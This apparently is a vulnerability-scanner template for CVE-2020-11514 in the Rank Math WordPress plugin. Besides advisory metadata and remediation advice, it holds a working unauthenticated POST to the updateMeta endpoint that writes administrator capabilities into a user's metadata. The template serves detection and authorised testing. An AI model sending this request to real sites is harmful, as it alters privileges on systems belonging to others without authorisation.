id: CVE-2020-11514

info:
  name: Rank Math Plugin Privilege Escalation
  author: ProjectDiscoveryAI
  severity: critical
  description: The Rank Math plugin through 1.0.40.2 for WordPress allows unauthenticated remote attackers to update arbitrary WordPress metadata, including the ability to escalate or revoke administrative privileges for existing users via the unsecured rankmath/v1/updateMeta REST API endpoint.
  impact: |
    Successful exploitation could allow an attacker to escalate privileges.
  remediation: |
    Update Rank Math Plugin to the latest patched version.
  reference:
    - https://www.wordfence.com/blog/2020/03/critical-vulnerabilities-affecting-over-200000-sites-patched-in-rank-math-seo-plugin/
    - https://rankmath.com/changelog/
    - https://wordpress.org/plugins/seo-by-rank-math/#developers
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-11514
    cwe-id: CWE-862
    epss-score: 0.01079
    epss-percentile: 0.84879
    cpe: cpe:2.3:a:rankmath:seo:*:*:*:*:free:wordpress:*:*
  metadata:
    vendor: rankmath
    product: seo
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/rankmath/v1/updateMeta"

    headers:
      Content-Type: application/json

    body: |
      {
        "objectID": "1",
        "objectType": "user",
        "meta": {
          "rank_math_capabilities": ["administrator"]
        }
      }
    matchers:
      - type: word
        words:
          - "User capabilities updated successfully"
        part: body
